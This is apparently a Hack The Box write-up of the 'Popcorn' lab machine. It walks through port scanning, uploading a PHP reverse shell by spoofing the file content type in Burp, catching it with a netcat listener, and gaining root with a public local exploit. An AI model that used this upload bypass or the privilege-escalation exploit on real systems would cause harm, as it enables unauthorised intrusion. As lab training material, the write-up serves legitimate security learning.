First what we need to do, is small recon.
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-17 19:42 CEST
Nmap scan report for 10.10.10.6
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3ec81b15211550ec6e63bcc56b807b38 (DSA)
|_  2048 aa1f7921b842f48a38bdb805ef1a074d (RSA)
80/tcp   open  http        Apache httpd 2.2.12 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.12 (Ubuntu)
9000/tcp open  cslistener?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.43 seconds
```
I don't find anything intresting port. Now we need to check directorys by gobuster. First what i recommend to do is check the website and try this ```index.html``` or ```index.php``` by this we can know, what kind of leangue running on the server. In this example work index, but when you get /index.php i recommend to add -x php in ur gobuster.

![image](https://github.com/Anogota/Popcorn/assets/143951834/2e406987-3998-45a8-9d50-11a33ebbaa47)

We can find some intresting by only one look pretty nice /torrent. Let's go into this directory. This website look normal, like everyone. I try find something in source code, but there nothing what might be useful to us. next my step is create a account.

![image](https://github.com/Anogota/Popcorn/assets/143951834/ac75211d-5ec4-4171-9453-ca13454af234)

We can upload a image, maybe by this we can do RCE. First step is ```cp /usr/share/webshell/php/php-reverse-shell.php ~/HTB``` and modifay there IP. I tryed, everything there, but can't upload jpg.php also chaning in burp too image/jpg, this don't work. But i upload a regular .torrent on the website and deeper we can also see something intresting.  We can upload screanshot, maybe there you can did a RCE

![image](https://github.com/Anogota/Popcorn/assets/143951834/1e5ddcb6-e023-4dbc-b6b1-575a0731d79e)

U need turn on the burp and intercept traffic.

And change it form application/php to 

![image](https://github.com/Anogota/Popcorn/assets/143951834/c1d42698-18a3-4a8a-af55-f24353191316)

and u will upload a shell, u can see there you shell, only what you need to do is ```nc -lvnp 9001```
and click into this shell:

![image](https://github.com/Anogota/Popcorn/assets/143951834/938944f4-dfdd-45cc-8eb3-b3fd95a7b925)

And we have a shell :)

![image](https://github.com/Anogota/Popcorn/assets/143951834/a3ebdd9f-a740-4f6f-b3ed-ddb72bff5b57)

Also in /home/george is user.txt, i don't show that time :).
Let's grab a root, when i insert ls -la in /home/george i saw many intresting directory by many are empty.
```
lrwxrwxrwx 1 george george      9 Oct 26  2020 .bash_history -> /dev/null
-rw-r--r-- 1 george george    220 Mar 17  2017 .bash_logout
-rw-r--r-- 1 george george   3180 Mar 17  2017 .bashrc
drwxr-xr-x 2 george george   4096 Mar 17  2017 .cache
-rw------- 1 root   root     1571 Mar 17  2017 .mysql_history
-rw------- 1 root   root       19 May  5  2017 .nano_history
-rw-r--r-- 1 george george    675 Mar 17  2017 .profile
-rw-r--r-- 1 george george      0 Mar 17  2017 .sudo_as_admin_successful
-rw-r--r-- 1 george george 848727 Mar 17  2017 torrenthoster.zip
-rw-r--r-- 1 george george     33 Oct 16 18:28 user.txt
```
But .cache are not empty, inside .cache we can ```motd.legal-displayed``` i've never saw this kind of file, little bit google about is and i found vuln.
```
https://www.exploit-db.com/exploits/14339
```

I download this exploit on machine.

![image](https://github.com/Anogota/Popcorn/assets/143951834/b2214630-393d-4451-a7ba-0146e0ee741f)

but rember to change chmod 700 ```/var/www/.ssh``` then ```chmod +x 14339.sh```
And u got a root.
